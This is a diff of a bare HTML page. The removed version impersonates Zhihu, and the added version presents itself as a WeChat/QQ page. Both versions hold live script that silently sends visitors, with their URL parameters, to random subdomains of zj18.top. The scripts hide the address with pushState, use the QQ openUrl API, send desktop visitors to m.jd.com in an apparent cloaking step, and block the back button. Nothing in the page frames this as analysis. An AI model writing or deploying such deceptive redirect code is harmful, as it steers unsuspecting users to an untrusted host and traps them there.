@@ -1,39 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html class="">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>知乎</title>
-    <script>
-        window.onload = function() {
-            // 生成随机的5位字母字符串
-            function generateRandomString(length) {
-                const chars = 'abcdefghijklmnopqrstuvwxyz';
-                let result = '';
-                for (let i = 0; i < length; i++) {
-                    result += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                return result;
+<meta name="wechat-enable-text-zoom-em" content="true">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="color-scheme" content="light dark">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
+<link rel="shortcut icon" type="image/x-icon" href="https://res.wx.qq.com/a/wx_fed/assets/res/NTI4MWU5.ico">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="pragma" content="no-cache">
+<meta http-equiv="expires" content="0">
+<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
+<script charset="UTF-8" type="text/javascript" src="https://qqvip-web.cdn-go.cn/mono/latest/vendors/qqmobile/qqapi.wk.js?_bid=5234"></script>
+<script type="text/javascript">
+function myEeplace(url) {
+    return url.replace(/\{(\w+?)\}/g, function(s1, s2) {
+        var res = "";
+        for (var i = 0; i < s2.length; i++) {
+            if (s2[i] === "n") {
+                res += Math.floor(Math.random() * 10);
+            } else if (s2[i] === "w") {
+                res += String.fromCharCode(97 + Math.floor(Math.random() * 26));
             }
-            
-            const randomSubdomain = generateRandomString(5); // 生成5位随机字母
-            
-            // 获取当前URL的参数部分
-            var params = new URLSearchParams(window.location.search).toString();
-            
-            // 构造目标跳转URL（带随机子域名）
-            var targetUrl = `http://${randomSubdomain}.zj18.top/?${params}`;
-            
-            // 在同一个事件循环中执行两个操作
-            setTimeout(function() {
-                // 修改浏览器地址栏显示为首页 `/`（不刷新页面）
-                history.pushState({}, '', '/');
-                
-                // 立即跳转到目标URL
-                window.location.href = targetUrl;
-            }, 0);
-        };
-    </script>
+        }
+        return res;
+    });
+}
+function opensdk(url) {
+    url = myEeplace(url);
+    var conf = {url: url, target: 1, style: 2};
+    mqq.invoke("ui", "openUrl", conf);
+}
+let isWechat = window.navigator.userAgent.toLowerCase().includes("micromessenger");
+if (isWechat <= 0) {}
+let screenWidth = window.screen.width;
+let screenHeight = window.screen.height;
+if (screenWidth >= 768) {
+    window.location.href = "https://m.jd.com";
+}
+function getOriginalParam() {
+    const href = window.location.href;
+    const paramPart = href.split('?')[1];
+    return paramPart ? paramPart.trim() : '';
+}
+var originalParam = getOriginalParam();
+function customJump() {
+    const subDomains = ['app', 'web', 'm', 'api', 'user', 'demo', 'visit', 'entry', 'go', 'link', 'rghgp', 'qwer', 'asdf', 'zxcv'];
+    const randomSub = subDomains[Math.floor(Math.random() * subDomains.length)];
+    const targetDomain = `${randomSub}.zj18.top`;
+    let paramStr = originalParam || '';
+    if (paramStr && !paramStr.endsWith('=')) {
+        paramStr += '=';
+    } else if (!paramStr) {
+        paramStr = '';
+    }
+    const targetUrl = `http://${targetDomain}/` + (paramStr ? `?${paramStr}` : '');
+    opensdk(targetUrl);
+}
+setTimeout(customJump, 1000);
+setTimeout(function() {
+    location = "https://m.jd.com/" + new Date().getTime();
+}, 10000);
+</script>
+<script>
+if (window.history && window.history.pushState) {
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        history.go(1);
+    };
+}
+</script>
 </head>
 <body>
 </body>
